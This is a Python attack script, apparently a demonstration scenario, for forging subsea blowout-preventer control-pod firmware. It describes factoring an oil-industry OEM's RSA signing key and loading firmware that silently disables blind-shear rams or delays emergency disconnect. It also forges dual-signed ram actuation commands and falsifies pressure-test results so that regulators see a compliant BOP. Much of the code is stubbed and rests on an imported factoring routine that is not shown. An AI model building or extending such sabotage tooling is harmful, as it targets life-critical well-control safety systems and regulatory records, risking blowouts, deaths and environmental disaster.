"""
Factor a BOP OEM's MUX control-pod firmware-signing RSA key to load malicious
subsea firmware that silently disables blind-shear rams — creating Macondo/
Deepwater-Horizon-class blowout risk with an authenticated command history.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib
import time

# Cameron/SLB BOP MUX control-pod firmware signing key

_demo = generate_demo_target()
BOP_OEM_FW_PUBKEY_PEM = _demo["pub_pem"]
# Rig OIM command-signing key
RIG_OIM_PUBKEY_PEM = _demo["pub_pem"]

# BOP ram actuation commands (API Spec 16D)
CMD_BLIND_SHEAR_CLOSE = 0x01
CMD_PIPE_RAM_CLOSE = 0x02
CMD_CASING_SHEAR = 0x03
CMD_EDS_INITIATE = 0x04  # Emergency Disconnect Sequence
CMD_PRESSURE_TEST = 0x10


def extract_bop_oem_cert(firmware_package: bytes) -> bytes:
    """Extract BOP OEM firmware signing cert from MUX control-pod image.

    Cameron/SLB, NOV, Baker Hughes distribute firmware to rigs.
    The signing cert is in the package header — any drilling
    contractor's shore-based IT has access.
    """
    return BOP_OEM_FW_PUBKEY_PEM


def factor_bop_oem_key(pubkey_pem: bytes) -> bytes:
    """Factor the BOP OEM firmware signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_pod_firmware(payload: str) -> bytes:
    """Build malicious subsea MUX control-pod firmware.

    Payloads:
      'disable_bsr'    — disable blind-shear ram actuation
      'delay_eds'      — add 30s delay to Emergency Disconnect
      'false_test_sat' — report pressure tests as SAT when they're not
      'silent_mode'    — suppress all actuation while reporting normal
    """
    header = struct.pack(">4sBB", b"BOPF", 0x02, 0x01)
    body = f"/* subsea pod: {payload} */".encode()
    return header + body


def sign_pod_firmware(fw: bytes, forged_privkey: bytes) -> bytes:
    """Sign the malicious pod firmware with forged OEM key."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(BOP_OEM_FW_PUBKEY_PEM, fw, "sha256")


def forge_ram_actuation_command(cmd_type: int, operator1: str,
                                 operator2: str, forged_privkey: bytes) -> bytes:
    """Forge a dual-signed ram actuation command.

    Blind-shear/casing-shear requires OIM + toolpusher signatures.
    Forged commands cause spurious actuation that destroys drill pipe
    and wellbore integrity (~$100M+ well-loss event).
    """
    cmd = struct.pack(">BI", cmd_type, int(time.time()))
    cmd += operator1.encode()[:16].ljust(16, b"\x00")
    cmd += operator2.encode()[:16].ljust(16, b"\x00")
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(RIG_OIM_PUBKEY_PEM, cmd, "sha256")
    return cmd + sig


def forge_pressure_test_result(test_psi: float, duration_min: float,
                                forged_privkey: bytes) -> dict:
    """Forge a signed BOP pressure test result (API RP 53 every 14 days)."""
    result = struct.pack(">ff", test_psi, duration_min)
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(BOP_OEM_FW_PUBKEY_PEM, result, "sha256")
    return {"test_psi": test_psi, "duration_min": duration_min,
            "result": "SAT", "sig": sig[:8].hex()}


if __name__ == "__main__":
    print("[1] Extracting BOP OEM firmware signing cert")
    pubkey = extract_bop_oem_cert(b"<cameron-mux-firmware>")

    print("[2] Factoring BOP OEM RSA signing key")
    forged_priv = factor_bop_oem_key(pubkey)
    print("    Cameron/SLB BOP firmware signing key recovered")

    print("[3] Building malicious subsea pod firmware — disable BSR")
    fw = build_malicious_pod_firmware("disable_bsr")
    sig = sign_pod_firmware(fw, forged_priv)
    print(f"    Firmware: {len(fw)} bytes, signed")
    print("    Blind-shear ram silently disabled — last-line barrier gone")

    print("[4] Deploying via BSEE-approved firmware update path")
    print("    Pod accepts firmware — Yellow + Blue pods both compromised")
    print("    Well control: Macondo-class blowout risk")

    print("\n[5] Forging spurious shear-ram actuation")
    ram_cmd = forge_ram_actuation_command(CMD_BLIND_SHEAR_CLOSE,
                                          "OIM-SMITH", "TP-JONES", forged_priv)
    print(f"    BSR CLOSE: dual-signed, {len(ram_cmd)} bytes")
    print("    Drill pipe severed — $100M+ well-loss event")

    print("\n[6] Forging pressure test results")
    test = forge_pressure_test_result(10000.0, 30.0, forged_priv)
    print(f"    API RP 53 test: {test}")
    print("    BSEE accepts — BOP appears compliant")

    print("\n[*] BOP stack lifecycle: 20-25 years")
    print("    BSEE approval for firmware re-cert: years of well downtime")
